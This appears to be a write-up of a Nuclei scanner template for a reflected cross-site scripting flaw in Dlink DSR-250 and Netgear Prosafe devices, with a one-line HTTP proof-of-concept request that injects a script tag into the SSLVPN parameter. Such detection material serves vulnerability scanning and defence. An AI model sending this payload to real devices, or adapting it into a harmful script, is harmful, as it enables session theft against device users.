# Nuclei Template: Dlink DSR-250 and Netgear Prosafe - Cross-Site Scripting
**Template ID:** dlink-netgear-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`dlink-netgear-xss.yaml`)

## Vulnerability Information & PoC

## Description
Dlink DSR-250 and Netgear Prosafe are vulnerable to reflected cross site scripting endpoint scgi-bin/platform.cgi in parameter SSLVPN.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/scgi-bin/platform.cgi?page=portalLogin.htm&portal=SSLVPN"><script>alert(document.domain)</script>
```

## References
- https://www.encripto.no/forskning/whitepapers/Netgear_prosafe_advisory_june_2015.pdf
